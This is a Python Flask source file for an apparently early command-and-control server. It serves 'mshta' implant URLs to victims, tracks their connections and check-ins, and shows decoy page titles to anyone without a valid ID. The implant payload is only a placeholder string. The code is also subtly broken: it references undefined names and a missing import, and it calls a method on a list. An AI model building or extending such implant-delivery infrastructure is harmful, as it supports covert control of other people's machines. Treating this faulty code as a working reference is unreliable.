import connect.color as color
import connect.util as util
import os
import time

from flask import Flask, render_template

app = Flask(__name__)
connections = []
host = '0.0.0.0'
implant_ids = {util.generate_id():'mshta'}
port = 8080
titles = ['The connections you build over time.', 'Everything is connected.', 'Unlock the mind to connect to the universe of thought.']


class Connection():

    implant_data = ''

    def __init__(self):
        self.connection_id = util.generate_id()
        self.last_checkin = '0:0:0'
        self.original_checkin = Connection.get_current_time()
        self.status = 'Waiting'
        self.type = ''

    def __str__(self):
        return f'Connection ID: {self.connection_id} || Original Checkin {self.original_checkin} || Last Checkin: {self.last_checkin} || Status: {self.status} || Type: {self.type}'

    def update_checkin(self):
        self.status = 'Success'
        self.last_checkin = self.get_current_time()

    def return_implant(self):
        return self.implant_data

    @staticmethod
    def get_current_time():
        return time.strftime("%H:%M:%S", time.localtime())

class MshtaConnection(Connection):

    implant_data = 'pwned brah'

    def __init__(self):
        super().__init__()
        self.type = 'mshta'

def display_connections():
    color.display_banner('Current Connections')
    if not connections:
        color.normal('No connections to display.\n')
        return 0
    for connection in connections:
        if connection.status == 'Success':
            color.success(f'\t{connection}')
        color.normal(f'\t{connection}')
    color.normal('')
    return 0

def display_implants():
    color.display_banner('Current Implants')
    for implant_id, implant_type in implant_ids.items():
        color.normal(f'http://{host}:{port}/{implant_id}')
    color.normal('')
    return 0

@app.route('/<type_id>', methods=['GET'])
def serve_implant(type_id):
    implant_types = {'mshta':MshtaConnection()}
    if type_id not in implant_ids.keys():
        return render_template(connection_template, title=Titles[random.randint(0,2)], data='')
    color.information('New Connection')
    connections.append(implant_types[implant_ids[type_id]])
    return connections[-1].return_implant()

@app.route('/connection/<int:connection_id>', methods=['POST'])
def checkin(connection_id):
    checkin_connection = [connection for connection in connections if connection.connection_id == connection_id]
    if not checkin_connection:
        return render_template(connection_template, title=Titles[random.randint(0,2)], data='')
    checkin_connection.update_checkin()

def run():
    os.environ['WERKZEUG_RUN_MAIN'] = 'true'
    app.run(host=host, port=port)
